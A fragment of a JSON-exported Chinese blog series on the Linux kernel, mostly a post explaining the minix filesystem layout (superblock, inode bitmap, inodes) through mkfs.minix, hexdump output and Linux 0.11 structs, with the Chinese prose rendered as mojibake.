*/\n    off_t off = lseek(fd, 0, SEEK_SET);\n    if (off == -1)\n        return panic();\n\n    char* buf = (char *) malloc(wsize);\n    /* è¯»å–æ–‡ä»¶å†…å®¹ */\n    ssize_t rsize = read(fd, buf, wsize);\n    if (rsize == -1)\n        return panic();\n\n    printf(\"%s\\n\", buf);\n    free(buf);\n    /* å…³é—­æ–‡ä»¶ */\n    int stat = close(fd);\n    if (stat == -1)\n        return panic();\n\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e"},{"url":"2018-10-14-understand-Kernel-5","fileName":"2018-10-14-understand-Kernel-5.md","title":"ç†è§£ Linux Kernel (5) - æ–‡ä»¶ç³»ç»Ÿ(å®è§‚æè¿°)","author":"fangfeng","date":"2018-10-14T00:00:00.000Z","tags":["Kernel","Linux","File System"],"content":"\u003cp\u003eç”¨æƒ¯äº†ç±» Unix ç³»ç»Ÿï¼Œåº”è¯¥è¯´æ–‡ä»¶ç³»ç»Ÿæ˜¯æ—¥å¸¸æœ€å¸¸æ¥è§¦çš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ¨¡å—ä¹‹ä¸€äº†ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ ls\nApplications Network      Users        bin          data         etc          net          sbin         usr\nLibrary      System       Volumes      cores        dev          home         private      tmp          var\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç©¶ç«Ÿä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ? ä¸ºä»€ä¹ˆéœ€è¦æ–‡ä»¶ç³»ç»Ÿ? éš¾é“æ–‡ä»¶ä¸æ˜¯ç®€å•åœ°å­˜å‚¨åˆ°å­˜å‚¨è®¾å¤‡ä¸€å—è¿ç»­åŒºåŸŸçš„å—?\u003c/p\u003e\n\u003ch2\u003eæ–‡ä»¶ç³»ç»Ÿçš„å½¢å¼\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬å‡è®¾æ–‡ä»¶æ˜¯ç®€å•åœ°å­˜å‚¨åœ¨å­˜å‚¨è®¾å¤‡(ç¡¬ç›˜ç­‰)æŸä¸€å—è¿ç»­åŒºåŸŸçš„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆå¦‚ä½•åœ¨å°åˆ™å‡ ç™¾Gï¼Œå¤§åˆ™å‡ åTç”šè‡³æ›´å¤§çš„å­˜å‚¨è®¾å¤‡ä¸Šæ‰¾åˆ°å…·ä½“çš„æŸä¸€æ–‡ä»¶ï¼Œå¹¶è¯»å–çš„å†…å­˜ä¸­å‘¢?\u003c/p\u003e\n\u003cp\u003eæœ€æ™®é€šçš„ï¼Œå°±åªèƒ½åœ¨å­˜å‚¨è®¾å¤‡ä¸Šä¸€å­—èŠ‚ä¸€å­—èŠ‚çš„æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸åº”çš„ç›®æ ‡æ–‡ä»¶ã€‚æ˜¯ä¸æ˜¯å¯ä»¥æƒ³è±¡ï¼Œè¿™ä¼šå¾ˆæ…¢å¾ˆæ…¢ã€‚\u003c/p\u003e\n\u003cp\u003eæœ‰æ²¡æœ‰å¿«ä¸€ç‚¹çš„ï¼Ÿå¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œå‚è€ƒç±»ä¼¼å­—å…¸çš„å½¢å¼å°±å¯ä»¥äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eç›®å½•å½¢å¼\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶å†…å®¹å¯èƒ½å¾ˆå¤§ï¼Œä½†ç›¸æ¯”ä¹‹ä¸‹ï¼Œæ–‡ä»¶åå°±å°äº†å¾ˆå¤š(å°±ç®—ä¸åŒç›®å½•ä¸‹åŒåæ–‡ä»¶å¾ˆå¤šï¼Œä½†æ˜¯è®°å½•å…¨è·¯å¾„åä¹Ÿä»£ä»·ä¸å¤§ã€‚å½“ç„¶äº†ï¼Œå¦‚æœéƒ½æ˜¯å°æ–‡ä»¶ã€ç©ºæ–‡ä»¶ï¼Œé‚£å°±ä¸ä¸€æ ·äº†)\u003c/p\u003e\n\u003cp\u003eé€šè¿‡ä¸ºæ‰€æœ‰æ–‡ä»¶é€šè¿‡æ–‡ä»¶åç¼–ä¸€ä¸ªç›®å½•ï¼ŒæŒ‡æ˜æ¯ä¸ªæ–‡ä»¶åœ¨å­˜å‚¨è®¾å¤‡ä¸Šçš„å…·ä½“ä½ç½®ã€‚è¿™æ ·éœ€è¦æ‰«æçš„å†…å®¹å°±ä¼šå°å¾ˆå¤šï¼Œä¹Ÿèƒ½æ›´å¿«åœ°å®šä½åˆ°æ–‡ä»¶å†…å®¹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eé€çº§ç›®å½•\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eä»…ä»…åªç¼–åˆ¶ä¸€ä¸ªç›®å½•ï¼Œé‚£ä¹ˆå±‚æ¬¡ç›®å½•åˆæœ‰ä»€ä¹ˆå®é™…æ„ä¹‰å—ï¼Ÿåªæ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·åˆ†ç±»ä¸åŒåŠŸèƒ½ã€ç›®çš„çš„æ–‡ä»¶å—ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eåˆ©ç”¨é€çº§ç›®å½•ï¼Œå¯ä»¥è€ƒè™‘å¯¹æ¬¡çº§ç›®å½•çš„å†…å®¹ç¼–åˆ¶ä¸Šä¸€çº§ç›®å½•ã€‚é€šè¿‡é¡¶çº§ç›®å½•å®šä½æ¬¡çº§ç›®å½•çš„å†…å®¹ï¼Œæ¬¡çº§ç›®å½•å®šä½å†æ¬¡çº§ç›®å½•ï¼Œæœ€åå¯¹åº”ç›®å½•ä¸‹çš„æ–‡ä»¶çš„å†…å®¹ã€‚\u003c/p\u003e\n\u003ch2\u003eæ–‡ä»¶ç³»ç»Ÿçš„ç»„ç»‡\u003c/h2\u003e\n\u003cp\u003eåœ¨ä¹‹å‰çš„ç†è§£é‡Œï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯æ¥ç®¡äº†æ•´ä¸ªå­˜å‚¨è®¾å¤‡ã€‚ä¼¼ä¹æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡å°±æ˜¯ç›´æ¥å…³è”çš„ï¼Œä¸¤ä¸ªä¸å¯åˆ†å‰²ã€‚æ²¡æœ‰å»ºç«‹æ–‡ä»¶ç³»ç»Ÿçš„ç¡¬ç›˜å°±ä¸èƒ½ä½¿ç”¨ï¼Œè€Œæ²¡æœ‰ç¡¬ç›˜ï¼Œæ–‡ä»¶ç³»ç»Ÿå°±æ²¡æœ‰äº†è½½ä½“ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œåœ¨å­¦ä¹  Linux çš„è¿‡ç¨‹ä¸­ï¼Œä¼¼ä¹å‘ç°ä¹Ÿå¹¶ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ã€‚æ²¡æœ‰ç›´æ¥ç¡¬ç›˜ï¼Œæ–‡ä»¶ç³»ç»Ÿä¸€æ ·å¯ä»¥å­˜åœ¨ã€‚ä¸€ç›´éƒ½æœ‰åœ¨ä½¿ç”¨ \u003ccode\u003e.img\u003c/code\u003e ç£ç›˜æ˜ åƒæ–‡ä»¶ï¼Œåªæ˜¯æ²¡æœ‰æ„è¯†åˆ°ï¼Œè¿™æ„è¯†æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ç§è½½ä½“ã€‚åŒæ ·çš„ï¼Œæ²¡æœ‰æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨æ“ä½œç³»ç»Ÿå¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸€æ ·æ˜¯å¯ä»¥åŠ è½½å„ç§å†…å®¹ï¼Œä¹ƒè‡³é¢„ç½®çš„æ–‡ä»¶ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨ Linux ä¸­ï¼Œæœ€å¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿå°±æ˜¯ ext2, ext3, ext4 ä¹‹æµäº†ã€‚å¶å°”ä¹Ÿæœ‰å¬è¿‡ç”¨è¿‡ï¼Œæ¯”å¦‚è¯´å‡†å¤‡æ¥å…¥æ–°çš„ç¡¬ç›˜çš„æ—¶å€™ã€‚ä½†æ˜¯ï¼ŒçœŸæ­£é‡Œé¢æ˜¯ä»€ä¹ˆæ ·çš„ã€‚è¿˜çœŸä¸äº†è§£ï¼Œext2,3,4 çš„åŒºåˆ«ï¼Œä¹Ÿæ ¹æœ¬ä¸çŸ¥é“ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶äº†ï¼Œæœ¬æ¬¡ä¹Ÿå¹¶ä¸ä¼šå¯¹è¿™äº›å†…å®¹è¿›è¡Œæè¿°ã€‚ç”±äºä¸€ç›´åœ¨å­¦ä¹  Linux 0.11 ç‰ˆæœ¬çš„æºç ï¼Œæ¥ä¸‹æ¥è¦æè¿°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ 0.11 ç‰ˆæœ¬ç›´æ¥ä½¿ç”¨çš„ minix æ–‡ä»¶ç³»ç»Ÿäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€å¼€å§‹ï¼Œå½“ç„¶æ˜¯åº”è¯¥æœ‰ä¸€ä¸ªæ„Ÿå®˜çš„å°è±¡ï¼Œæ‰èƒ½æ›´æ–¹ä¾¿åœ°æ¥ç†è§£æ–‡ä»¶ç³»ç»Ÿçš„ç»„ç»‡å½¢å¼å•¦!\u003c/p\u003e\n\u003ch3\u003eåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ\u003c/h3\u003e\n\u003cp\u003eè¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª 512 KB å¤§å°çš„æ–‡ä»¶ç³»ç»Ÿ\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emkfs\u003c/code\u003e åº”è¯¥æ˜¯æœ€ç®€å•çš„æ–¹å¼äº†ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ touch disk.img            # ç£ç›˜æ˜ åƒæ–‡ä»¶ (ç”±äºæ²¡æœ‰é¢å¤–çš„ç£ç›˜ï¼Œå°±ä»¥æ­¤ä½œä¸ºæ–°åˆ›å»ºçš„ minix æ–‡ä»¶ç³»ç»Ÿçš„è½½ä½“)\n$ dd if=/dev/zero of=disk.img bs=1024 count=512     # å…ˆå°†æ–‡ä»¶çš„å¤§å°æ‰©å±•åˆ° 512 KB ï¼Œå¦åˆ™åœ¨åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„æ—¶å€™ä¼šå¤±è´¥\n512+0 records in\n512+0 records out\n524288 bytes (524 kB, 512 KiB) copied, 0.00216049 s, 243 MB/s\n$ mkfs.minix disk.img 512   # åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ\n192 inodes                  # inodes - åº”è¯¥å¾ˆç†Ÿæ‚‰å§ã€‚æ¯ä¸ªæ–‡ä»¶éƒ½å ç”¨ä¸€ä¸ª inode\n512 blocks                  # æ€»å…± 512 ä¸ªç£ç›˜å—\nFirstdatazone=10 (10)       # ç¬¬ 10 ä¸ªç£ç›˜å—å¼€å§‹æ˜¯çœŸæ­£çš„æ•°æ®å—ã€‚å‰é¢æ˜¯ä»€ä¹ˆ? å¤§éƒ¨åˆ†æ˜¯ç›®å½•å ç”¨çš„\nZonesize=1024               # æ¯ä¸ªç£ç›˜å—çš„å¤§å°ä¸º 1024 B\nMaxsize=268966912           # å•ä¸€æ–‡ä»¶çš„æœ€å¤§å¤§å°\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå…ˆæ¥çœ‹çœ‹ç›®å‰ disk.img é‡Œé¢çš„å†…å®¹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ hexdump disk.img\n0000000 0000 0000 0000 0000 0000 0000 0000 0000\n*                                                   # * è¡¨ç¤ºè¿™æ®µæ•°æ®å…¨ä¸º 0\n0000400 00c0 0200 0001 0001 000a 0000 1c00 1008\n0000410 138f 0001 0000 0000 0000 0000 0000 0000\n0000420 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000800 0003 0000 0000 0000 0000 0000 0000 0000\n0000810 0000 0000 0000 0000 fffe ffff ffff ffff\n0000820 ffff ffff ffff ffff ffff ffff ffff ffff\n*                                                   # * è¡¨ç¤ºè¿™æ®µæ•°æ®å…¨ä¸º ff ( * æ€»æ˜¯è¡¨ç¤ºä¸å‰ä¸€æ®µæ•°æ®ä¸€è‡´çš„çœç•¥)\n0000c00 0003 0000 0000 0000 0000 0000 0000 0000\n0000c10 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000c30 0000 0000 0000 0000 0000 0000 0000 ff80\n0000c40 ffff ffff ffff ffff ffff ffff ffff ffff\n*\n0001000 41ed 0000 0040 0000 cf12 5bd3 0200 000a\n0001010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0002800 0001 002e 0000 0000 0000 0000 0000 0000\n0002810 0000 0000 0000 0000 0000 0000 0000 0000\n0002820 0001 2e2e 0000 0000 0000 0000 0000 0000\n0002830 0000 0000 0000 0000 0000 0000 0000 0000\n0002840 0000 622e 6461 6c62 636f 736b 0000 0000\n0002850 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0080000                                             # æˆªæ­¢å­—èŠ‚ï¼Œ0x80000 = 512 KB å¹¶ä¸å­˜åœ¨\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä¼¼ä¹å¹¶æ²¡æœ‰å¤ªå¤šçš„æ„Ÿè§‰ï¼Œç°åœ¨æˆ‘ä»¬å¾€ disk.img è¿™ä¸ªç£ç›˜æ˜ åƒæ–‡ä»¶ä¸­æ·»äº›å†…å®¹å†æ¥çœ‹çœ‹ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ mount disk.img /mnt   # æŠŠ disk.img æŒ‚è½½åˆ° /mnt ç›®å½•ä¸‹\n$ cd /mnt\n$ echo \"#include \u0026#x3C;stdio.h\u003e\" \u003e hello.c       # åˆ›å»º hello.c æ–‡ä»¶ï¼Œå¹¶å†™å…¥ #include \u0026#x3C;stdio.h\u003e \n$ umount /mnt           # è§£æŒ‚ disk.img\n$ hexdump -C disk.img\n00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000400  c0 00 00 02 01 00 01 00  0a 00 00 00 00 1c 08 10  |................|\n00000410  8f 13 01 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000800  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000810  00 00 00 00 00 00 00 00  fe ff ff ff ff ff ff ff  |................|\n00000820  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|\n*\n00000c00  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000c10  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000c30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 80 ff  |................|\n00000c40  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|\n*\n00001000  ed 41 00 00 60 00 00 00  e5 0d d4 5b 00 02 0a 00  |.A..`......[....|\n00001010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00001020  a4 81 00 00 13 00 00 00  e5 0d d4 5b 00 01 0b 00  |...........[....|\n00001030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00002800  01 00 2e 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002820  01 00 2e 2e 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002840  02 00 68 65 6c 6c 6f 2e  63 00 00 00 00 00 00 00  |..hello.c.......|\n00002850  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00002c00  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include \u0026#x3C;stdio.|\n00002c10  68 3e 0a 00 00 00 00 00  00 00 00 00 00 00 00 00  |h\u003e..............|\n00002c20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00080000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† \u003ccode\u003e#include \u0026#x3C;stdio.h\u003e\u003c/code\u003e å­—æ ·çš„å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿå‡ºç°äº† \u003ccode\u003ehello.c\u003c/code\u003e çš„æ–‡ä»¶åã€‚\u003c/p\u003e\n\u003cp\u003eéœ€è¦æ³¨æ„ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹æ˜¯ç›¸äº’å‰²è£‚çš„ï¼Œå¹¶æ²¡æœ‰ç›´æ¥å­˜å‚¨åœ¨ä¸€èµ·ã€‚\u003c/p\u003e\n\u003ch3\u003eæ–‡ä»¶ç³»ç»Ÿå­˜å‚¨ç»“æ„\u003c/h3\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œé…åˆç€ä¸Šé¢çš„å†…å®¹æ¥çœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿçš„ç»„ç»‡ç»“æ„ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå¯ä»¥æ³¨æ„åˆ°çš„æ˜¯ï¼Œæ¯ä¸€æ®µéé›¶çš„æ•°æ®çš„å¼€å§‹åœ°å€ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨ \u003ccode\u003e0x0000, 0x0400, 0x0800, 0x0c00, 0x1000\u003c/code\u003e ã€‚é—´éš”äº† 0x0400 = 1KBï¼Œè¿™å°±æ˜¯æœ€åŸºæœ¬çš„å—çš„å¤§å°ã€‚\u003c/p\u003e\n\u003cp\u003eMinix æ–‡ä»¶ç³»ç»Ÿå°† 1024 B ä½œä¸ºåŸºæœ¬å—çš„å¤§å°ã€‚\u003ccode\u003edisk.img\u003c/code\u003e è¿™ä¸ª 512 KB çš„ç£ç›˜æ˜ åƒæ–‡ä»¶ï¼Œä¹Ÿå°±æ°å¥½è¢«åˆ†å‰²æˆ 512 å—ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ mkfs.minix disk.img 512   # åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ\n192 inodes                  # inodes - åº”è¯¥å¾ˆç†Ÿæ‚‰å§ã€‚æ¯ä¸ªæ–‡ä»¶éƒ½å ç”¨ä¸€ä¸ª inode\n512 blocks                  # æ€»å…± 512 ä¸ªç£ç›˜å—\nFirstdatazone=10 (10)       # ç¬¬ 10 ä¸ªç£ç›˜å—å¼€å§‹æ˜¯çœŸæ­£çš„æ•°æ®å—ã€‚å‰é¢æ˜¯ä»€ä¹ˆ? å¤§éƒ¨åˆ†æ˜¯ç›®å½•å ç”¨çš„\nZonesize=1024               # æ¯ä¸ªç£ç›˜å—çš„å¤§å°ä¸º 1024 B\nMaxsize=268966912           # å•ä¸€æ–‡ä»¶çš„æœ€å¤§å¤§å°\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåœ¨å›è¿‡å¤´æ¥çœ‹çœ‹å‰é¢åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„æ—¶å€™çš„ä¿¡æ¯ï¼Œç›¸ä¿¡ä¹Ÿå°±èƒ½å¤Ÿçœ‹æ‡‚ä¸€éƒ¨åˆ†äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eå—çš„ä½œç”¨åˆ’åˆ†\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œæ¯ä¸ªå—å¦‚ä½•è¿›è¡Œä½¿ç”¨å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œæœ€å¼€å§‹çš„ä¸€ä¸ªå—å¹¶ä¸ä¼šç›´æ¥ä½¿ç”¨ã€‚æˆ‘ä»¬çŸ¥é“å¼•å¯¼ç¨‹åºåº”è¯¥å‡ºç°åœ¨å¼•å¯¼ç›˜æœ€å¼€å§‹ 512 Bã€‚ä½†æ˜¯ï¼Œæœ‰äº›ç›˜æœ‰å¼•å¯¼ç¨‹åºï¼Œæœ‰äº›ç›˜åˆæ²¡æœ‰ï¼Œå¦‚ä½•å¤„ç†å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ–‡ä»¶ç³»ç»Ÿç»“æ„ä¸­ï¼Œé»˜è®¤åœ°ä¸å¯¹ç¬¬ä¸€ä¸ª 1024 B çš„å—è¿›è¡Œæ“ä½œï¼Œå³åŸæœ¬æ˜¯ä»€ä¹ˆæ•°æ®å°±æ˜¯ä»€ä¹ˆæ•°æ®ï¼Œä¸æ–‡ä»¶ç³»ç»Ÿå¹¶ä¸ç›¸å¹²ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fwnnc753epj31kw04tq35.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eé™¤äº†å¼•å¯¼å—ï¼Œä¹‹åè¿˜æœ‰è¶…çº§å—ï¼Œinode ä½å›¾ï¼Œé€»è¾‘å—ä½å›¾ï¼Œinode åŒºå—ï¼Œæ•°æ®åŒºå—\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eè¶…çº§å—\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eçœŸæ­£å¯¹ MINIX æ–‡ä»¶ç³»ç»Ÿèµ·ç€ç»Ÿé¢†æ€§ä½œç”¨çš„ï¼Œæ˜¯è¶…çº§å—(ç¬¬äºŒä¸ªå—)ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct super_block {\n unsigned short s_ninodes;          /* i èŠ‚ç‚¹çš„æ•°é‡ */\n unsigned short s_nzones;           /* æ€»åŒºå—æ•°é‡ */\n unsigned short s_imap_blocks;      /* i èŠ‚ç‚¹ä½å›¾çš„æ•°é‡ */\n unsigned short s_zmap_blocks;      /* åŒºå—ä½å›¾çš„æ•°é‡ */\n unsigned short s_firstdatazone;    /* ç¬¬ä¸€ä¸ªæ•°æ®å—çš„ç¼–å· */\n unsigned short s_log_zone_size;    /* log2(ç£ç›˜å—å¤§å° / é€»è¾‘å—å¤§å°) */\n unsigned long s_max_size;          /* å•æ–‡ä»¶çš„æœ€å¤§é•¿åº¦ */\n unsigned short s_magic;            /* æ–‡ä»¶ç³»ç»Ÿçš„é­”æ•° */\n\n /* ä¸‹é¢çš„å†…å®¹æ˜¯åœ¨å†…å­˜ä¸­ä½¿ç”¨çš„ï¼Œå¹¶ä¸ä¼šåœ¨ç£ç›˜ä¸Šè¿›è¡Œè¯»å†™ */\n struct buffer_head * s_imap[8];\n struct buffer_head * s_zmap[8];\n unsigned short s_dev;\n struct m_inode * s_isup;\n struct m_inode * s_imount;\n unsigned long s_time;\n struct task_struct * s_wait;\n unsigned char s_lock;\n unsigned char s_rd_only;\n unsigned char s_dirt;\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eç»“åˆç€ \u003ccode\u003edisk.img\u003c/code\u003e çš„æ•°æ®æ¥çœ‹çœ‹ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003e00000400  c0 00 00 02 01 00 01 00  0a 00 00 00 00 1c 08 10  |................|\n00000410  8f 13 01 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n\n0x00c0  -\u003e 192 ä¸ª i èŠ‚ç‚¹\n0x0200  -\u003e 512 ä¸ªé€»è¾‘å—\n0x0001  -\u003e ä¸€ä¸ªièŠ‚ç‚¹ä½å›¾\n0x0001  -\u003e ä¸€ä¸ªé€»è¾‘å—ä½å›¾\n0x000a  -\u003e ç¬¬ä¸€ä¸ªæ•°æ®å—ç¼–å·ä¸º 10 \n0x0000  -\u003e log2(ç£ç›˜å—å¤§å° / é€»è¾‘å—å¤§å°) = 0 ï¼Œå³ç£ç›˜å—å¤§å° = é€»è¾‘å—å¤§å° = 1024 B\n0x10081c00 -\u003e å•æ–‡ä»¶æœ€å¤§ 268966912 B \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003einode ä½å›¾\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003einode ä½å›¾çš„æ•°æ®æ¯”è¾ƒç®€å•ï¼Œæ˜¯é€šè¿‡è®¾ç½®æ¯”ç‰¹ä½ 0ã€1 çš„æ–¹å¼ï¼Œæ¥ç›´æ¥è¡¨æ˜ç›¸åº”ç¼–å·çš„ i èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ã€‚\né»˜è®¤ i èŠ‚ç‚¹ä» 1 å·å¼€å§‹ç¼–å·ï¼Œ0 å·èŠ‚ç‚¹åœ¨ inode ä½å›¾ä¸Šä¸€å®šè®¾ç½®ä¸º 1 \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003e00000800  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000810  00 00 00 00 00 00 00 00  fe ff ff ff ff ff ff ff  |................|\n00000820  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæ€»å…± 192 ä¸ª i èŠ‚ç‚¹ï¼ŒåŠ ä¸Š 0 å·èŠ‚ç‚¹æ€»è®¡éœ€å ç”¨ 193 ä½ ( = 193 / 8 = 24 å­—èŠ‚ + 1 ä½)\u003c/p\u003e\n\u003cp\u003eå…¶ä½™å¤šä½™çš„ä½ï¼Œå…¨éƒ¨ç½®ä½ä¸º 1 ã€‚\u003c/p\u003e\n\u003cp\u003eä½å›¾å­˜å‚¨çš„æœ€åˆæ•°æ® 0x07 (æ³¨æ„ï¼Œå°ç«¯å­˜å‚¨æ³•) = 0b111\u003c/p\u003e\n\u003cp\u003eç”±æ­¤ï¼Œæ€»å…±æœ‰1å·å’Œ2å·ièŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eé€»è¾‘å—ä½å›¾\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eç±»ä¼¼çš„ï¼Œé€»è¾‘å—ä½å›¾æ˜¯ä¸ºäº†è¡¨æ˜ç¬¬nä¸ªé€»è¾‘å—å­˜å‚¨æœ‰æ•°æ®ï¼Œæˆ–å¤„äºç©ºé—²çŠ¶æ€ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003einode åŒºå—\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå‚ç…§å‰é¢è®²è¿‡çš„å­—å…¸ç›®å½•çš„å½¢å¼ï¼Œinode å°±æ˜¯ä¸€ç§åˆ†çº§ç¼–æ’åçš„ç›®å½•ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¯´ç›®å½•å¯èƒ½è¿˜ä¼šå¼•å‘è¯¯è§£ã€‚è¿™é‡Œæ— è®ºæ˜¯å¯¹äºæ“ä½œç³»ç»Ÿä¸‹çš„ç›®å½•æˆ–æ˜¯æ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªéƒ½å¯¹åº”ç€ä¸€ä¸ªç‹¬ç‰¹çš„ inode\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct d_inode {\n unsigned short i_mode;     /* æ–‡ä»¶ç±»å‹å’Œå±æ€§ (rwx ä½) */\n unsigned short i_uid;      /* æ–‡ä»¶æ‰€æœ‰è€… id */\n unsigned long i_size;      /* æ–‡ä»¶å¤§å° */\n unsigned long i_time;      /* ä¿®æ”¹æ—¶é—´ */\n unsigned char i_gid;       /* æ–‡ä»¶æ‰€åœ¨ç»„ id */\n unsigned char i_nlinks;    /* æœ‰å¤šå°‘ä¸ªé“¾æ¥æ•° (æœ‰å¤šå°‘ä¸ªæ–‡ä»¶ç›®å½•é¡¹æŒ‡å‘è¯¥ i èŠ‚ç‚¹) */\n unsigned short i_zone[9];  /* æ–‡ä»¶æ•°æ®æ‰€å ç”¨æ•°æ®ç›˜çš„æŒ‡é’ˆ */\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæ¯ä¸ªièŠ‚ç‚¹çš„æ•°æ®åˆ†åˆ« 32 å­—èŠ‚\u003c/p\u003e\n\u003cp\u003eåŒæ ·çš„ï¼Œç»“åˆ \u003ccode\u003edisk.img\u003c/code\u003e çš„æ•°æ®æ¥çœ‹\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e00001000  ed 41 00 00 60 00 00 00  e5 0d d4 5b 00 02 0a 00  |.A..`......[....|\n00001010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00001020  a4 81 00 00 13 00 00 00  e5 0d d4 5b 00 01 0b 00  |...........[....|\n00001030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n\n0x41ed  -\u003e \n0x0000  -\u003e  æ–‡ä»¶æ‰€æœ‰è€…ä¸º 0 å³ root\n0x00000060  -\u003e  æ–‡ä»¶å¤§å°ä¸º 96 